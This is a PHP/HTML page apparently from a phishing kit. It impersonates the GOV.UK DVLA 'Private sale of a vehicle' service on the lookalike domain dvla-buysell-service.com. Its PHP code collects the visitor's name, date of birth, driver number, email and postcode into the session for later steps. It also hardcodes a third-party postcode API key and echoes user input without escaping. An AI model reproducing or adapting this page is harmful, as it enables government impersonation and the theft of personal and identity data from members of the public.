<?php
session_start();
// Check if the session data exists
$make = isset($_SESSION['v_make']) ? $_SESSION['v_make'] : 'N/A';
$model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';



// set varriables in session
$_SESSION['privatekeeper_title.titleOption'] = $_POST['privatekeeper_title_titleOption'];
$_SESSION['privatekeeper_title.titleText'] = $_POST['privatekeeper_title.titleText'];
$_SESSION['privatekeeper_firstname'] = $_POST['privatekeeper_firstname'];
$_SESSION['privatekeeper_lastname'] = $_POST['privatekeeper_lastname'];
$_SESSION['privatekeeper_dateofbirth.day'] = $_POST['privatekeeper_dateofbirth_day'];
$_SESSION['privatekeeper_dateofbirth.month'] = $_POST['privatekeeper_dateofbirth_month'];
$_SESSION['privatekeeper_dateofbirth.year'] = $_POST['privatekeeper_dateofbirth_year'];
$_SESSION['privatekeeper_drivernumber'] = $_POST['privatekeeper_drivernumber'];
$_SESSION['privatekeeper_option_email'] = $_POST['privatekeeper_option_email'];
$_SESSION['privatekeeper_email.email'] = $_POST['privatekeeper_email_email'];
$_SESSION['privatekeeper_postcode'] = $_POST['privatekeeper_postcode'];

$_SESSION['seller_dob'] = sprintf(
    '%04d-%02d-%02d',
    $_POST['privatekeeper_dateofbirth_year'],
    $_POST['privatekeeper_dateofbirth_month'],
    $_POST['privatekeeper_dateofbirth_day']
);



?>

<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!--<base href="#">-->
    <base href=".">
    <meta name="download_date" content="2024-01-08T12:13:48.625Z">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Select new keeper address - Private sale of a vehicle - GOV.UK</title>
    <link href="./styles.css" rel="stylesheet" type="text/css" />

    <link href="../style.css" rel="stylesheet" type="text/css" />

    <link rel="shortcut icon" href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#"
        type="image/x-icon">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#" sizes="72x72">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#" sizes="76x76">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#" sizes="114x114">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#" sizes="120x120">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#" sizes="144x144">
    <link rel="apple-touch-icon-precomposed"
        href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#" sizes="152x152">
    <base href=".">
</head>

<body class="js-enabled vsc-initialized" data-closing-time="1140">
    <div id="global-cookie-message">
        <div class="cookie-message-wrapper">
            <p>GOV.UK uses cookies to make the site simpler.&nbsp;<a
                    href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#">Find out
                    more about cookies</a>
            </p>
        </div>
    </div>
    <a href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#"
        class="govuk-skip-link">Skip to main content</a>
    <header class="govuk-header " role="banner" data-module="govuk-header">
        <div class="govuk-header__container govuk-width-container">
            <div class="govuk-header__logo">
                <a class="govuk-header__link govuk-header__link--homepage" data-track-action="logoLink"
                    data-track-category="headerClicked" data-track-label="https://www.gov.uk"
                    data-track-dimension="GOV.UK" data-track-dimension-index="29"
                    data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;header menu bar&quot;,&quot;external&quot;:&quot;false&quot;,&quot;text&quot;:&quot;GOV.UK&quot;,&quot;section&quot;:&quot;Logo&quot;,&quot;index_link&quot;:1,&quot;index_section&quot;:0,&quot;index_section_count&quot;:2,&quot;index_total&quot;:1}"
                    id="logo" aria-label="Go to the GOV.UK homepage" href="#" https:="" www.gov.uk"="">
                    <span class="govuk-header__logotype">
                        <!--[if gt IE 8]><!-->

                        <!--<![endif]-->
                        <!-- [if IE 8]> -->
                        <img src="./assets/logo.svg" style="filter: invert(100%);" alt=""
                            class="govuk-header__logotype-crown-fallback-image mb-3" width="36" height="32">
                        <!-- <![endif] -->
                        <span class="govuk-header__logotype-text" style="color: white;">
                            GOV.UK
                        </span>
                    </span>
                </a>
            </div>

            <div class="govuk-header__content">
                <a href="" style="font-size: 25px !important; font-weight: 500 !important;"
                    class="govuk-header__link govuk-header__service-name govuk-header-m-white">
                    Private sale of a vehicle
                </a>
            </div>

        </div>
    </header>
    <div id="main">
        <div class="govuk-width-container">
            <div class="govuk-phase-banner">
                <p class="govuk-phase-banner__content">
                    <strong class="govuk-tag govuk-phase-banner__content__tag">
                        beta
                    </strong>
                    <span class="govuk-phase-banner__text">
                        This is a new service -
                        <a class="govuk-link" id="feedback-open"
                            href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#"
                            target="_blank">your feedback</a>
                        will help us to improve it
                    </span>
                </p>
            </div>
            <div class="section-content">
                <a class="govuk-back-link" id="back"
                    href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#">Back</a>
                <script>
                    document.getElementById('back').addEventListener('click', function() {
                        history.back();
                    });
                </script>
            </div>
            <main class="govuk-main-wrapper" id="main-content">
                <div class="app vehicles-change-keeper-online">
                    <div class="two-col clearfix">
                        <div class="first-col">
                            <div class="playback">
                                <h2>Vehicle details</h2>
                                <dl>
                                    <dt>Registration number</dt>
                                    <dd>
                                        <span class="reg-number"><?php echo $_SESSION['v_registration']; ?></span>
                                    </dd>
                                    <dt>Make</dt>
                                    <dd><?php echo htmlspecialchars($make); ?></dd>
                                    <dt>Model</dt>
                                    <dd><?php echo htmlspecialchars($model); ?></dd>
                                </dl>
                            </div>
                            <div style="font-weight:bold;" class="govuk-warning-text">
                                <span class="govuk-warning-text__icon" aria-hidden="true">!</span>
                                <strong class="govuk-warning-text__text">
                                    <span class="govuk-warning-text__assistive">Warning</span>
                                    <p><strong>If the vehicle details shown are incorrect please abandon this
                                            transaction and send the V5C registration certificate (logbook) with a
                                            covering letter to DVLA, Swansea, SA99 1BA.</strong>
                                    </p>
                                </strong>
                            </div>
                        </div>
                        <div class="second-col">
                            <!-- ####form submission######## -->
                            <h1>Select new keeper address</h1>
                            <form action="./4 - Sale details - Private sale of a vehicle - GOV.UK.php" method="POST">
                                <div class="playback">
                                    <dl>
                                        <dt>Name</dt>
                                        <dd><?php echo  $_SESSION['privatekeeper_firstname'] = $_POST['privatekeeper_firstname'] . ' ' . $_SESSION['privatekeeper_firstname'] = $_POST['privatekeeper_lastname']; ?></dd>
                                        <dt>Email address</dt>
                                        <dd>
                                            <span>
                                                <?php echo $_SESSION['email']; ?> </span>
                                        </dd>
                                        <dt>Postcode</dt>
                                        <dd id="p_code"><?php echo $_SESSION['privatekeeper_postcode'] = $_POST['privatekeeper_postcode']; ?></dd>
                                    </dl>
                                </div>
                                <br>
                                <div class="form-item">
                                    <label for="newKeeperChooseYourAddress_addressSelect">
                                        Choose the new keepers address
                                    </label>
                                    <label for="address">Select your address:</label>
                                    <select name="address" id="address-select">
                                        <option value="">Please select your address</option>
                                    </select>
                                    <!-- <select id="address" name="address">
                                        <option
                                            value="Bab Zee Salon, 61 West Green Road, London, Greater London, N15 5DA">
                                            Bab Zee Salon, 61 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Bens Off Licence, 65 West Green Road, London, Greater London, N15 5DA">
                                            Bens Off Licence, 65 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Chicks Chicken &amp; Pizza, 51 West Green Road, London, Greater London, N15 5DA">
                                            Chicks Chicken &amp; Pizza, 51 West Green Road, London, Greater London, N15
                                            5DA
                                        </option>
                                        <option
                                            value="De Bastos Ltd, 91 West Green Road, London, Greater London, N15 5DA">
                                            De Bastos Ltd, 91 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Dream Nails, 81 West Green Road, London, Greater London, N15 5DA">
                                            Dream Nails, 81 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Leyco Tyres &amp; Brakes, 95 West Green Road, London, Greater London, N15 5DA">
                                            Leyco Tyres &amp; Brakes, 95 West Green Road, London, Greater London, N15
                                            5DA
                                        </option>
                                        <option value="Makimayo, 75 West Green Road, London, Greater London, N15 5DA">
                                            Makimayo, 75 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Nice Cut, 83 West Green Road, London, Greater London, N15 5DA">
                                            Nice Cut, 83 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Simon Stewart Clothing, 89 West Green Road, London, Greater London, N15 5DA">
                                            Simon Stewart Clothing, 89 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Simply Cargo Ltd, 69 West Green Road, London, Greater London, N15 5DA">
                                            Simply Cargo Ltd, 69 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Tasters, 93 West Green Road, London, Greater London, N15 5DA">
                                            Tasters, 93 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="The Bash Restaurant, 71-73 West Green Road, London, Greater London, N15 5DA">
                                            The Bash Restaurant, 71-73 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Tiwa N Tiwa, 77 West Green Road, London, Greater London, N15 5DA">
                                            Tiwa N Tiwa, 77 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="West Green Supermarket, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            West Green Supermarket, 57-59 West Green Road, London, Greater London, N15
                                            5DA
                                        </option>
                                        <option value="51A West Green Road, London, Greater London, N15 5DA">51A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="51B West Green Road, London, Greater London, N15 5DA">51B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="53 West Green Road, London, Greater London, N15 5DA">53 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="53A West Green Road, London, Greater London, N15 5DA">53A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="53B West Green Road, London, Greater London, N15 5DA">53B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="55 West Green Road, London, Greater London, N15 5DA">55 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="55A West Green Road, London, Greater London, N15 5DA">55A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="55A-55C West Green Road, London, Greater London, N15 5DA">55A-55C
                                            West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="55B West Green Road, London, Greater London, N15 5DA">55B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="55C West Green Road, London, Greater London, N15 5DA">55C West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 1, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 1, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Flat 1-10, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 1-10, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 2, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 2, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 3, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 3, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 4, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 4, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 5, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 5, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 6, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 6, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 7, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 7, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 8, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 8, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 9, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 9, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat 10, 57-59 West Green Road, London, Greater London, N15 5DA">
                                            Flat 10, 57-59 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="61A West Green Road, London, Greater London, N15 5DA">61A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="63 West Green Road, London, Greater London, N15 5DA">63 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="63A West Green Road, London, Greater London, N15 5DA">63A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="65A West Green Road, London, Greater London, N15 5DA">65A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat A, 65A West Green Road, London, Greater London, N15 5DA">
                                            Flat A, 65A West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat B, 65A West Green Road, London, Greater London, N15 5DA">
                                            Flat B, 65A West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat C, 65A West Green Road, London, Greater London, N15 5DA">
                                            Flat C, 65A West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat D, 65A West Green Road, London, Greater London, N15 5DA">
                                            Flat D, 65A West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="67 West Green Road, London, Greater London, N15 5DA">67 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="69A West Green Road, London, Greater London, N15 5DA">69A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="71A West Green Road, London, Greater London, N15 5DA">71A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="71A-71B West Green Road, London, Greater London, N15 5DA">71A-71B
                                            West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="71B West Green Road, London, Greater London, N15 5DA">71B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="73A West Green Road, London, Greater London, N15 5DA">73A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="73A-73B West Green Road, London, Greater London, N15 5DA">73A-73B
                                            West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="73B West Green Road, London, Greater London, N15 5DA">73B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="77A West Green Road, London, Greater London, N15 5DA">77A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="77A-77C West Green Road, London, Greater London, N15 5DA">77A-77C
                                            West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="77B West Green Road, London, Greater London, N15 5DA">77B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="77C West Green Road, London, Greater London, N15 5DA">77C West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="79 West Green Road, London, Greater London, N15 5DA">79 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="First Floor Flat, 79 West Green Road, London, Greater London, N15 5DA">
                                            First Floor Flat, 79 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Ground Floor Flat, 79 West Green Road, London, Greater London, N15 5DA">
                                            Ground Floor Flat, 79 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option
                                            value="Second Floor Flat, 79 West Green Road, London, Greater London, N15 5DA">
                                            Second Floor Flat, 79 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="79A West Green Road, London, Greater London, N15 5DA">79A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="81A West Green Road, London, Greater London, N15 5DA">81A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="83A West Green Road, London, Greater London, N15 5DA">83A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="83B West Green Road, London, Greater London, N15 5DA">83B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="85 West Green Road, London, Greater London, N15 5DA">85 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="85A West Green Road, London, Greater London, N15 5DA">85A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="87 West Green Road, London, Greater London, N15 5DA">87 West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="87A West Green Road, London, Greater London, N15 5DA">87A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="87B West Green Road, London, Greater London, N15 5DA">87B West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="87C West Green Road, London, Greater London, N15 5DA">87C West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat A, 89 West Green Road, London, Greater London, N15 5DA">Flat
                                            A, 89 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat B, 89 West Green Road, London, Greater London, N15 5DA">Flat
                                            B, 89 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat C, 89 West Green Road, London, Greater London, N15 5DA">Flat
                                            C, 89 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="89A West Green Road, London, Greater London, N15 5DA">89A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="91A West Green Road, London, Greater London, N15 5DA">91A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat A, 93 West Green Road, London, Greater London, N15 5DA">Flat
                                            A, 93 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat B, 93 West Green Road, London, Greater London, N15 5DA">Flat
                                            B, 93 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="Flat C, 93 West Green Road, London, Greater London, N15 5DA">Flat
                                            C, 93 West Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="93A West Green Road, London, Greater London, N15 5DA">93A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                        <option value="95A West Green Road, London, Greater London, N15 5DA">95A West
                                            Green Road, London, Greater London, N15 5DA
                                        </option>
                                    </select> -->
                                </div>
                                <a id="enterAddressManuallyButton"
                                    href="https://dvla-buysell-service.com/buysell-service/next/after/then/selectaddy.php#">
                                    Address is not in the list
                                </a>
                                <div class="form-item " style="margin-top: 20px;">
                                    <input class="govuk-button" style="font-size: 18px;" id="mileage" name="step-4"
                                        value="Continue" type="submit" autocomplete="off" maxlength="6">
                                </div>
                            </form>

                        </div>
                    </div>
                </div>
            </main>
        </div>
    </div>
    <footer class="gem-c-layout-footer govuk-footer gem-c-layout-footer--border" role="contentinfo"
        data-module="ga4-link-tracker" data-ga4-link-tracker-module-started="true">
        <div class="govuk-width-container">

            <div class="govuk-footer__meta">
                <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
                    <h2 class="govuk-visually-hidden">Support links</h2>
                    <ul class="govuk-footer__inline-list govuk-!-display-none-print" data-module="gem-track-click"
                        data-track-links-only="" data-gem-track-click-module-started="true">
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/help"
                                data-track-options="{&quot;dimension29&quot;:&quot;Help&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" help"="">Help</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/help/privacy-notice"
                                data-track-options="{&quot;dimension29&quot;:&quot;Privacy&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;2&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" help="" privacy-notice"="">Privacy</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/help/cookies"
                                data-track-options="{&quot;dimension29&quot;:&quot;Cookies&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;3&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" help="" cookies"="">Cookies</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/help/accessibility-statement"
                                data-track-options="{&quot;dimension29&quot;:&quot;Accessibility statement&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;4&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" help="" accessibility-statement"="">Accessibility
                                statement</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/contact"
                                data-track-options="{&quot;dimension29&quot;:&quot;Contact&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;5&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" contact"="">Contact</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/help/terms-conditions"
                                data-track-options="{&quot;dimension29&quot;:&quot;Terms and conditions&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;6&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" help="" terms-conditions"="">Terms and conditions</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" lang="cy" data-track-category="footerClicked"
                                data-track-action="supportLink" data-track-label="/cymraeg"
                                data-track-options="{&quot;dimension29&quot;:&quot;Rhestr o Wasanaethau Cymraeg&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;7&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" cymraeg"="">Rhestr
                                o Wasanaethau Cymraeg</a>
                        </li>
                        <li class="govuk-footer__inline-list-item">
                            <a class="govuk-footer__link" data-track-category="footerClicked"
                                data-track-action="supportLink"
                                data-track-label="/government/organisations/government-digital-service"
                                data-track-options="{&quot;dimension29&quot;:&quot;Government Digital Service&quot;}"
                                data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;8&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                                href="#" https:="" www.gov.uk="" government="" organisations=""
                                government-digital-service"="">Government Digital
                                Service</a>
                        </li>
                    </ul>
                    <svg aria-hidden="true" focusable="false" class="govuk-footer__licence-logo"
                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 483.2 195.7" height="17" width="41">
                        <path fill="currentColor"
                            d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145">
                        </path>
                    </svg>
                    <span class="govuk-footer__licence-description" data-module="gem-track-click"
                        data-track-action="copyrightLink" data-track-category="footerClicked"
                        data-track-label="https://www.nationalarchives.gov.uk/doc/open-government-licence/version/3/"
                        data-track-options="{&quot;dimension29&quot;: &quot;Open Government Licence v3.0&quot;}"
                        data-track-links-only="" data-ga4-track-links-only=""
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;section&quot;:&quot;Licence&quot;,&quot;index_section&quot;:&quot;4&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;text&quot;:&quot;Open Government Licence v3.0&quot;,&quot;index_total&quot;:&quot;1&quot;,&quot;type&quot;:&quot;footer&quot;}"
                        data-gem-track-click-module-started="true">
                        All content is available under the <a class="govuk-footer__link" href="#" https:=""
                            www.nationalarchives.gov.uk="" doc="" open-government-licence="" version="" 3="" "="" rel="
                            license">Open Government Licence v3.0</a>,
                        except where otherwise stated
                    </span>
                </div>
                <div class="govuk-footer__meta-item" data-module="gem-track-click" data-track-action="copyrightLink"
                    data-track-category="footerClicked"
                    data-track-label="https://www.nationalarchives.gov.uk/information-management/re-using-public-sector-information/uk-government-licensing-framework/crown-copyright/"
                    data-track-options="{&quot;dimension29&quot;: &quot;© Crown copyright&quot;}"
                    data-track-links-only=""
                    data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;section&quot;:&quot;Copyright&quot;,&quot;index_section&quot;:&quot;5&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;text&quot;:&quot;© Crown copyright&quot;,&quot;index_total&quot;:&quot;1&quot;,&quot;type&quot;:&quot;footer&quot;}"
                    data-gem-track-click-module-started="true">

                    <a class="govuk-footer__link govuk-footer__copyright-logo" href="#" https:=""
                        www.nationalarchives.gov.uk="" information-management="" re-using-public-sector-information=""
                        uk-government-licensing-framework="" crown-copyright="">© Crown copyright</a>
                </div>
            </div>
        </div>
    </footer>
    <div id=" global-app-error" class="app-error hidden">
    </div>
    <script>
        const sessionPostalCode = "<?php echo  $_SESSION['privatekeeper_postcode'] ?>";
        // Function to fetch addresses from the API
        async function fetchAddresses(postcode) {

            const apiKey = "9XZq0IDOLnXkbrqwf6vSyoSVkG3wkYf5xY51dTQpvNI";
            const url = `https://api.easypostcodes.com/addresses/${postcode}`;

            try {
                const response = await fetch(url, {
                    headers: {
                        'Key': apiKey
                    }
                });

                if (!response.ok) {
                    throw new Error(`Error: ${response.status}`);
                }

                const data = await response.json();
                const addressList = data.map(item => item.envelopeAddress.summaryLine);
                populateAddressDropdown(addressList);
            } catch (error) {
                console.error("Error fetching addresses:", error);
                document.getElementById("addresses").innerHTML = `<p style="color: red;">Failed to fetch addresses. Please try again later.</p>`;
            }
        }

        // Function to display the fetched addresses
        function populateAddressDropdown(addressList) {
            const selectElement = document.getElementById("address-select");

            // Clear any existing options (except the first default option)
            selectElement.innerHTML = '<option value="">Please select an address</option>';

            // Map through the array of addresses and create an option for each address
            addressList.forEach(address => {
                const optionElement = document.createElement("option");
                optionElement.value = address;
                optionElement.textContent = address;
                selectElement.appendChild(optionElement); // Add the option to the select box
            });
        }

        // Call the API when the page loads
        window.onload = function() {
            fetchAddresses(sessionPostalCode);
        };
    </script>



</body>

</html>